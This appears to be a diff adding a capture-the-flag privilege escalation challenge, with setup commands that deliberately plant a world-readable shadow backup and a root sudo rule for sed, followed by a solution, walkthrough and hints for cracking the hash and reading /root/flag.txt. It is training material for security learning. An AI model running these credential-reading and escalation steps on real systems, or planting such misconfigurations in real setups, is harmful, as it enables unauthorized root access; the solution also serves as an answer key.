@@ -1,0 +1,52 @@
+title: The long way up
+level: Expert
+kind: Privilege escalation
+points: 100
+order: 30
+answer: flag
+var: PW = word
+
+@intro
+You are the user player. Getting to root takes two steps here: a readable backup
+holds another user's password hash, and that user may run a program as root that can
+read any file. Crack the hash, become that user, then reach /root/flag.txt.
+
+@setup
+useradd -m player 2>/dev/null || true
+useradd -m maria
+echo 'maria:{{PW}}' | chpasswd
+printf '%s\n' '{{FLAG}}' > /root/flag.txt
+chmod 600 /root/flag.txt
+mkdir -p /var/backups
+grep '^maria:' /etc/shadow > /var/backups/shadow.old
+chmod 644 /var/backups/shadow.old
+echo 'maria ALL=(root) NOPASSWD: /usr/bin/sed' > /etc/sudoers.d/maria
+chmod 440 /etc/sudoers.d/maria
+
+@solution
+cat /var/backups/shadow.old
+hashcrack /var/backups/shadow.old
+su - maria
+{{PW}}
+sudo -l
+sudo sed -n p /root/flag.txt
+exit
+
+@walkthrough
+1. A readable shadow backup. /var/backups/shadow.old is world-readable and holds
+   maria's hash. Crack it: hashcrack /var/backups/shadow.old.
+2. Become maria: su - maria, then the cracked password.
+3. maria's sudo right. sudo -l shows she may run /usr/bin/sed as root. sed prints
+   files (sed -n p FILE), so it reads root's flag:
+
+       sudo sed -n p /root/flag.txt
+
+The lesson: two small mistakes (a readable shadow backup and sudo on a file tool)
+chain into full root. Each on its own is worth fixing.
+
+@hint 15
+Step 1: crack the hash in /var/backups/shadow.old. Step 2: su to that user and run
+sudo -l.
+
+@hint 25
+After su - maria: sudo sed -n p /root/flag.txt
